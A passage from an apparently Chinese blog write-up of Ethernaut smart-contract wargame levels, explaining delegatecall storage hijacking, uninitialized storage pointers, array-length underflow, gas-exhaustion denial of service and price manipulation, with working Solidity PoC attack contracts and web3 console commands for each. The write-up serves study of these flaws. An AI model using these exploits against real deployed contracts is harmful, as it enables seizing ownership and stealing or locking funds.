<p>​    在上述代码中，如果调用a0函数，看起来是在a0中调用合约b中的b0将b1的值修改为了1111，实际上分别调用getA1和getB1可以发现，被赋值1111的是a1而不是b1。这正是delegatecall调用其他合约中函数的特性，代码是在a合约的环境中执行的，操作的也是a合约的 storage 。</p>
<p>引用大佬分析：</p>
<blockquote>
<p>所以这个题就很好办了，我们调用<code>Preservation</code>的<code>setFirstTime</code>函数时候实际通过 delegatecall 执行了<code>LibraryContract</code>的<code>setTime</code>函数，修改了<code>timeZone1Library</code>变量。<br>这样，我们第一次调用<code>setFirstTime</code>将<code>timeZone1Library</code>变量修改为我们的恶意合约的地址，第二次调用<code>setFirstTime</code>就可以执行我们的任意代码了。</p>
</blockquote>
<p>Poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract PreservationPoc &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  </span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    owner = address(_time);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//修改为恶意合约地址</span><br><span class="line">await contract.setFirstTime(&quot;0xBF85F10dADb216Ca5093dF8238dE314d9BB7d407&quot;)</span><br><span class="line">//修改为自己的地址</span><br><span class="line">await contract.setFirstTime(&quot;0x2eb4081c419d1890eb0af97ce5a9689cad2fe3da&quot;)</span><br></pre></td></tr></table></figure>

<p>​    第一次调用setFirstTime是将恶意合约地址作为参数传给LiberayContract合约中setTime的参数，然后在setTime中将恶意合约地址赋给storedTime,由于delegatecall调用的特性，实际上恶意合约地址被赋给了timeZone1Library。然后第二次调用setFirstTime的时候，调用delegatecall的地址变成了恶意合约的地址，执行了恶意合约方法，将自己的地址赋值给了owner变量。</p>
<p>​    使用await contract.owner()查看合约拥有者，如果是自己地址，那么恭喜，你通关了。</p>
<p>大佬还有一句话：</p>
<blockquote>
<p> 函数中的局部变量默认为存储或内存，具体取决于其类型。未初始化的本地存储变量可以指向合约中的其他意外存储变量，从而导致故意（即开发人员故意将它们放在那里进行攻击）或无意的漏洞。 </p>
</blockquote>
<p>关键;</p>
<ul>
<li>delegatecall调用其他合约函数的特点</li>
<li>uint类型可以存储地址</li>
</ul>
<h2 id="Locked"><a href="#Locked" class="headerlink" title="Locked"></a>Locked</h2><p>通关条件：</p>
<ul>
<li>解锁registrar</li>
</ul>
<p>​    照旧贴大佬分析：</p>
<blockquote>
<p>为了讨论这个漏洞，首先我们需要了解存储（Storage）在 Solidity 中的工作方式。作为一个高度抽象的概述（没有任何适当的技术细节——我建议阅读 Solidity 文档以进行适当的审查），状态变量按它们出现在合约中的顺序存储在合约的 <em>Slot</em> 中（它们可以被组合在一起，但在本例中不可以，所以我们不用担心）。因此， <code>unlocked</code> 存在 <code>slot 0</code> 中， <code>registeredNameRecord</code> 存在 <code>slot 1</code> 中， <code>resolve</code> 在 <code>slot 2</code> 中，等等。这些 slot 的大小是 32 字节（映射会让事情更加复杂，但我们暂时忽略）。如果 <code>unlocked</code> 是 <code>false</code> ，其布尔值看起来会是 <code>0x000...0</code>（64 个 0，不包括 <code>0x</code> ）；如果是 <code>true</code> ，则其布尔值会是 <code>0x000...1</code> （63 个 0）。正如你所看到的，在这个特殊的例子中，存储上存在着很大的浪费。</p>
<p>我们需要的另一部分知识，是 Solidity 会在将复杂的数据类型，比如 <code>structs</code> ，初始化为局部变量时，默认使用 storage 来存储。因此，在 [16] 行中的 <code>newRecord</code> 默认为storage。合约的漏洞是由 <code>newRecord</code> 未初始化导致的。由于它默认为 storage，因此它成为指向 storage 的指针；并且由于它未初始化，它指向 slot 0（即 <code>unlocked</code> 的存储位置）。请注意，[17] 行和[18] 行中，我们将 <code>_name</code> 设为 <code>nameRecord.name</code> 、将 <code>_mappedAddress</code> 设为 <code>nameRecord.mappedAddress</code> 的操作，实际上改变了 slot 0 和 slot 1 的存储位置，也就是改变了 <code>unlocked</code> 和与 <code>registeredNameRecord</code> 相关联的 slot。</p>
<p>这意味着我们可以通过 <code>register()</code> 函数的 <code>bytes32 _name</code> 参数直接修改 <code>unlocked</code> 。因此，如果 <code>_name</code> 的最后一个字节为非零，它将修改 slot 0 的最后一个字节并直接将 <code>unlocked</code> 转为 <code>true</code> 。就在我们将 <code>unlocked</code> 设置为 <code>true</code> 之时，这样的 <code>_name</code> 值将传入 [23] 行的 <code>require()</code> 函数。在Remix中试试这个。注意如果你的 <code>_name</code> 使用下面形式，函数会通过： <code>0x0000000000000000000000000000000000000000000000000000000000000001</code></p>
</blockquote>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23; </span><br><span class="line"></span><br><span class="line">// A Locked Name Registrar</span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = false;  // registrar locked, no name updates</span><br><span class="line">    </span><br><span class="line">    struct NameRecord &#123; // map hashes to addresses</span><br><span class="line">        bytes32 name; // </span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names </span><br><span class="line">    mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses</span><br><span class="line">    </span><br><span class="line">    function register(bytes32 _name, address _mappedAddress) public &#123;</span><br><span class="line">        // set up the new NameRecord</span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        require(unlocked); // only allow registrations if contract is unlocked</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LockedPoc &#123;</span><br><span class="line">    function hack(address target) public &#123;</span><br><span class="line">        Locked lock = Locked(target);</span><br><span class="line">        lock.register(bytes32(1),address(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    struct 初始化为局部变量时，默认使用 storage 来存储，它成为指向 storage 的指针；并且由于它未初始化，它指向 slot 0（即 <code>unlocked</code> 的存储位置） 。在其他文章看到的都是结论很少有完全解释清楚原理的，留个疑问，看以后能不能解决吧。</p>
<p>关键：</p>
<ul>
<li>存储在solidity的工作方式</li>
</ul>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>通关条件：</p>
<ul>
<li>从丢失的合同中找回0.5 ether</li>
</ul>
<p>​    由于区块链一切都是透明的，所以我们可以通过etherscan直接查询到丢失合约的地址。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img5.png" alt="img5"></p>
<p>​    箭头所指就是新建的token合约地址，通过Remix的At address功能，我们可以直接操作已部署在链上的合约。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img6.png" alt="img6"></p>
<p>​    通过destroy函数我们可以将合约自毁并将那0.5 ether取出。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img4.png" alt="img4"></p>
<p>​    可以看到调用destroy后，合约自毁，并将余额全部转入我的钱包了。</p>
<p>​    在Remix中还可以通过部署合约来调用destroy来转出余额，这样的方式相比使用At Address要略显麻烦一些，不过也是一种方式。</p>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  function() public payable ;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public ;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address _to) public ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract RecoveryPoc &#123;</span><br><span class="line">    SimpleToken target;</span><br><span class="line">    constructor(address _addr) public&#123;</span><br><span class="line">        target = SimpleToken(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        target.destroy(tx.origin);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    还有一种更加麻烦的方式是自己计算合约地址，可以看这篇文章——<a href="https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3" target="_blank" rel="noopener">Ethernaut Lvl 18 Recovery Walkthrough: How to retrieve lost contract addresses (in 2 ways)</a>。</p>
<p>​     public a = address（keccak256（0xd6,0x94，YOUR_ADDR，0x01））</p>
<p>​    通关后还给出了一篇文章介绍了一种隐秘且危险的方式存储ether： <a href="https://swende.se/blog/Ethereum_quirks_and_vulns.html" target="_blank" rel="noopener">https://swende.se/blog/Ethereum_quirks_and_vulns.html</a> </p>
<p>关键：</p>
<ul>
<li>区块链上一切都是透明的</li>
<li>如何找回丢失的地址</li>
<li>selfdestroy的使用</li>
</ul>
<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><p>通关条件：</p>
<ul>
<li>使用正确的数字响应题目合约</li>
</ul>
<p>​    先放大佬的Poc吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var bytecode = &quot;0x600a600c600039600a6000f3602A60805260206080f3&quot;;</span><br><span class="line">web3.eth.sendTransaction(&#123; from: player, data: bytecode &#125;, function(err,res)&#123;console.log(res)&#125;);</span><br><span class="line">await contract.setSolver(&quot;contract address&quot;);</span><br></pre></td></tr></table></figure>

<p>​    字节码的生成可以参考这篇文章：<a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2" target="_blank" rel="noopener">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes</a></p>
<p>​    生命的意义： <a href="https://baike.baidu.com/item/42/16630643?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/42/16630643?fr=aladdin</a> </p>
<p>​    合约创建相关： <a href="https://www.jianshu.com/p/d9137e87c9d3" target="_blank" rel="noopener">https://www.jianshu.com/p/d9137e87c9d3</a> </p>
<p>​    接下来回到这道题吧，题目要求使用正确的数字响应合约。由题目代码可以初步判断返回数字应该是42，这个42的由来可以看上面生命的意义的百科，还有个要求是代码最多10个操作码，这个时候使用remix来部署合约就有点不现实了。我们可以使用web3.eth提供的sendTransaction来部署合约，for example：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// using the callback</span><br><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: &apos;0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe&apos;,</span><br><span class="line">    data: code // deploying a contract</span><br><span class="line">&#125;, function(error, hash)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>​    from的值在题目中可以由player代替，data的code需要看字节码生成那篇文章了，由于水平有限，我还不能理解T.T。不过有一点需要注意，那篇文章中所返回的是0x42并不是42，所以我们需要吧42修改为2A,即0x2A=42。</p>
<p>​    使用sendTransaction部署合约后，可以通过返回的交易哈希来获取合约地址，然后将contrant address替换为合约地址即可。</p>
<p>关键：</p>
<ul>
<li>生命的意义</li>
<li>使用opcode创建合约</li>
<li>web3.eth.sendTransaction的使用</li>
<li>EVM汇编</li>
</ul>
<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><p>通关条件：</p>
<ul>
<li>声明合约所有权</li>
</ul>
<p>​     <a href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol" target="_blank" rel="noopener"><code>Ownable.sol</code>源码传送门</a> </p>
<p>​    首先面对的问题是modifier contacted，所有函数都包含它，所以必须先是contact为true。</p>
<p>​    make_contact能够帮我们做到，唯一条件是传入一个长度大于2**200的数组，由于这里没有对数组内容进行检测，仅仅是检测了数组长度，所以我们可以伪造。</p>
<p>​    修改contactPoc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sig = web3.sha3(&quot;make_contact(bytes32[])&quot;).slice(0,10)</span><br><span class="line">// &quot;0x1d3d4c0b&quot;</span><br><span class="line">// 函数选择器</span><br><span class="line">data1 = &quot;0000000000000000000000000000000000000000000000000000000000000020&quot;</span><br><span class="line">// 除去函数选择器，数组长度的存储从第 0x20 位开始</span><br><span class="line">data2 = &quot;1000000000000000000000000000000000000000000000000000000000000001&quot;</span><br><span class="line">// 数组的长度</span><br><span class="line">await contract.contact()</span><br><span class="line">// false</span><br><span class="line">contract.sendTransaction(&#123;data: sig + data1 + data2&#125;);</span><br><span class="line">// 发送交易</span><br><span class="line">await contract.contact()</span><br><span class="line">// true</span><br></pre></td></tr></table></figure>

<p>​    solidity中计算存储位时使用公式为：<br>$$<br>keccak256(slot) + index<br>$$</p>
<blockquote>
<p>之后就是一个经典的 OOB (out of boundary) Attack</p>
<p>首先通过调用 <code>retract()</code>，使得 <code>codex</code> 数组长度下溢。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, <span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;alert(y)&#125;);</span><br><span class="line"><span class="comment">// codex.length</span></span><br><span class="line"><span class="comment">// 0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">contract.retract()</span><br><span class="line"><span class="comment">// codex.length--</span></span><br><span class="line"></span><br><span class="line">web3.eth.getStorageAt(contract.address, <span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;alert(y)&#125;);</span><br><span class="line"><span class="comment">// codex.length</span></span><br><span class="line"><span class="comment">// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还需要了解一些 Solidity 中各种变量的存储方式。<br>这里推荐知道创宇的一篇文章：<a href="https://www.freebuf.com/articles/blockchain-articles/177260.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/blockchain-articles/177260.html</a></p>
<p>可以简单将动态数组内变量的存储位计算方法概括为：<br><code>b[X] == SLOAD(keccak256(slot) + X)</code></p>
<p>在本题中，数组 codex 的 slot 为 1，同时也是存储数组长度的地方。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sha3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">bytes32</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>    <span class="keyword">return</span> binascii.unhexlify(<span class="string">'%064x'</span>%i)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sha3.keccak_256(bytes32(<span class="number">1</span>)).hexdigest()</span><br><span class="line"><span class="string">'b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span>**<span class="number">256</span> - <span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span></span><br><span class="line"><span class="number">35707666377435648211887908874984608119992236509074197713628505308453184860938</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可计算出，<code>codex[35707666377435648211887908874984608119992236509074197713628505308453184860938]</code> 对应的存储位就是 slot 0。</p>
<p>之前提到 slot 0 中同时存储了 <code>contact</code> 和 <code>owner</code>，只需将 <code>owner</code> 替换为 player 地址即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">await contract.owner()</span><br><span class="line">// &quot;0x73048cec9010e92c298b016966bde1cc47299df5&quot;</span><br><span class="line">contract.revise(&apos;35707666377435648211887908874984608119992236509074197713628505308453184860938&apos;,&apos;0x000000000000000000000001676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf&apos;)</span><br><span class="line">// 调用 revise()</span><br><span class="line">await contract.owner()</span><br><span class="line">// &quot;0x676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf&quot;</span><br><span class="line">// Submit instance</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>​    参考文档：</p>
<p><a href="https://xz.aliyun.com/t/2914" target="_blank" rel="noopener">ethernaut 题目Alien Codex write up</a>  </p>
<p><a href="http://mitah.cn/index.php/archives/14/" target="_blank" rel="noopener">Zeppelin Ethernaut writeup</a> </p>
<h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>通关条件：</p>
<ul>
<li>在调用withdraw的时候，禁止owner分走账户的1%余额。</li>
</ul>
<blockquote>
<p>address.call.value(x)() 可以向合约发送更多的gas</p>
<p>assert(0==1) 触发异常之后会消耗所有可用的 gas </p>
</blockquote>
<p>​    要使owner.transfer(amountToSend)执行失败，就需要使owner报错或者前面的语句将gas消耗完。很明显，在这里我们只能让前面的语句把gas消耗完来阻止owner提钱。</p>
<p>​    partner默认没有赋值，这正好给了我们利用途径。新建一个合约：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.22 &lt;0.6.0;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        assert(0==1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    将partner赋值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.setWithdrawPartner(&quot;0xD8Da635f4c5356942AbF3A1C67194E44C3F80a8f&quot;)</span><br></pre></td></tr></table></figure>

<p>​    然后调用withdraw()：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>

<p>​    这里就要小小回顾下，要阻止转账的成功，这里提到的有两个方式：</p>
<ul>
<li>在其调用转账代码之前将gas消耗完毕</li>
<li>转账目标主动抛出异常</li>
</ul>
<p>关键：</p>
<ul>
<li>assert()失败耗费所有gas</li>
</ul>
<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
<p>​    404 Not found ╮(╯▽╰)╭我也想做，可是它是404啊！</p>
</blockquote>
<p>11.22 更新！Ethernaut终于更新了！全（chuan）新版本——0.5.0现已上线。</p>
<p>通过条件：</p>
<ul>
<li>最终价格低于叫价 </li>
</ul>
<p>​    简单分析一波：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;//初始价格</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">    //要满足这个条件，买家给出的价格要大于等于100，并且货物没有卖出</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price.gas(3000)();</span><br><span class="line">    //将买家出的价格作为出售价格</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    问题很简单，只要使price() 两次返回不同的值即可，有很多方法可以办到，那么问题来了：应该根据什么判断应该返回哪个值呢。最开始我想的是设一个bool变量，在第一次被调用后修改该变量的值，第二次便可以返回不同的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//就像这样</span><br><span class="line">	bool public flag = false;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint)&#123;</span><br><span class="line">        if (flag == true)&#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">        return 102;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    然而，编译都通不过！因为view这个修饰符的限定，我们不能修改状态，修改状态在官方文档中如是介绍：</p>
<blockquote>
<h5 id="View-函数"><a href="#View-函数" class="headerlink" title="View 函数"></a>View 函数</h5><p>可以将函数声明为 <code>view</code> 类型，这种情况下要保证不修改状态。</p>
<p>下面的语句被认为是修改状态：</p>
<ol>
<li>修改状态变量。</li>
<li><a href="file:///C:/Users/xzy/Desktop/Work/solidity-中文文档/index.html#events" target="_blank" rel="noopener">产生事件</a>。</li>
<li>创建其它合约</li>
<li>使用 <code>selfdestruct</code>。</li>
<li>通过调用发送以太币。</li>
<li>调用任何没有标记为 <code>view</code> 或者 <code>pure</code> 的函数。</li>
<li>使用低级调用。</li>
<li>使用包含特定操作码的内联汇编。</li>
</ol>
</blockquote>
<p>​    所以我们得另寻他法，回到题目合约中，我们可以发现在第一次调用price() 的前后，布尔型变量isSold的值发生了改变，那么我们是不是可以通过它来作为判断条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function price() external view returns (uint)&#123;</span><br><span class="line">    if (target.isSold() == true)&#123;</span><br><span class="line">        return 99;</span><br><span class="line">    &#125;</span><br><span class="line">    return 102;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    然而，编译是通过了，在调用函数的时候，Remix提示如下：</p>
<blockquote>
<h6 id="Gas-estimation-failed"><a href="#Gas-estimation-failed" class="headerlink" title="Gas estimation failed"></a>Gas estimation failed</h6><p>Gas estimation errored with the following message (see below). The transaction execution will likely fail. Do you want to force sending?<br>gas required exceeds allowance (8000029) or always failing transaction</p>
</blockquote>
<p>​    这段话大概的意思就是无法估计gas的消耗，搜索一通后还是没有解决这个问题。</p>
<p>​    后来在他人的帮助下才知道，不能使用变量作为判断条件，因为在执行判断之前还要去storage中访问target变量的值，这会消耗大量的gas，导致后面无法正常运行，从而失败。</p>
<p><img src="/2019/11/09/Ethernaut%20WriteUp/img9.png" alt></p>
<p>​    通过etherscan上的追踪，我们可以看到，失败的原因就是这里，访问storage需要消耗800gas，而此时没有那么多gas了。</p>
<p>​    将target改为Shop(msg.sender) 就没有问题了，在if语句外面，我们已经使用了msg.sender，就不需要再次去访问storage，从而减少了gas的消耗。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    function price() external view returns (uint)&#123;</span><br><span class="line">        if (Shop(msg.sender).isSold() == true)&#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">        return 102;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    完整Poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price.gas(3000)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer&#123;</span><br><span class="line">    </span><br><span class="line">    Shop target;</span><br><span class="line">    </span><br><span class="line">    function attack(address _addr) public&#123;</span><br><span class="line">        target = Shop(_addr);</span><br><span class="line">        target.buy();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function price() external view returns (uint)&#123;</span><br><span class="line">        if (Shop(msg.sender).isSold() == true)&#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">        return 102;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    price中的if语句还可以使用更加简单的方式写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return Shop(msg.sender).isSold()?99:102;</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
